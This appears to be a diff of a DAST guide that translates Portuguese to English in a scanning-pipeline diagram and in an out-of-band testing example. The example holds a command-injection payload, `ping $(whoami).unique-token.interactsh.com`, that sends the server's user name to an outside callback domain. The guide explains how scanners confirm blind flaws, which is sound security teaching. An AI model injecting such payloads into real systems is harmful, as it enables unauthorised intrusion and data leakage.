@@ -38,25 +38,25 @@ DAST operates by systematically sending specially crafted HTTP/HTTPS requests to
 
 ```
 ┌────────────────────────────────────────────────────────────────────────┐
-│                        PIPELINE DE EXECUÇÃO DAST                       │
+│                        DAST EXECUTION PIPELINE                         │
 └────────────────────────────────────────────────────────────────────────┘
   [ 1. Discovery / Crawling ]
-         │  (Spidering tradicional + Headless DOM Crawler para SPAs)
+         │  (Traditional spidering + Headless DOM Crawler for SPAs)
          ▼
   [ 2. Surface Mapping & API Ingestion ]
-         │  (Importação OpenAPI, GraphQL Schema, WSDL, Postman Collections)
+         │  (OpenAPI, GraphQL Schema, WSDL, Postman Collections Import)
          ▼
   [ 3. Passive Scanning ]
-         │  (Inspeção de cabeçalhos de segurança, cookies, CSP, SSL/TLS)
+         │  (Inspection of security headers, cookies, CSP, SSL/TLS)
          ▼
   [ 4. Active Scanning / Fuzzing ]
-         │  (Injeções parametrizadas: SQLi, XSS, SSRF, Command Injection)
+         │  (Parameterized injections: SQLi, XSS, SSRF, Command Injection)
          ▼
   [ 5. OAST Verification (Out-of-Band) ]
-         │  (Confirmação de vulnerabilidades cegas via callbacks DNS/HTTP)
+         │  (Confirmation of blind vulnerabilities via DNS/HTTP callbacks)
          ▼
   [ 6. Triage & Quality Gate ]
-            (Cálculo de CVSS v3.1/v4.0, eliminação de falsos positivos e relatório)
+             (CVSS v3.1/v4.0 calculation, false-positive elimination, and report)
 ```
 
 ### 1. Passive Scanning
@@ -85,7 +85,7 @@ DAST operates by systematically sending specially crafted HTTP/HTTPS requests to
 - The injected payload instructs the server to resolve a unique DNS name or make an external HTTP call to the OAST server domain:
   ```
   Payload: `ping $(whoami).unique-token.interactsh.com`
-  Servidor OAST: Recebe a consulta DNS `root.unique-token.interactsh.com` -> Vulnerabilidade Confirmada (Zero Falso Positivo).
+  OAST Server: Receives the DNS query `root.unique-token.interactsh.com` -> Vulnerability Confirmed (Zero False Positive).
   ```
 
 ---
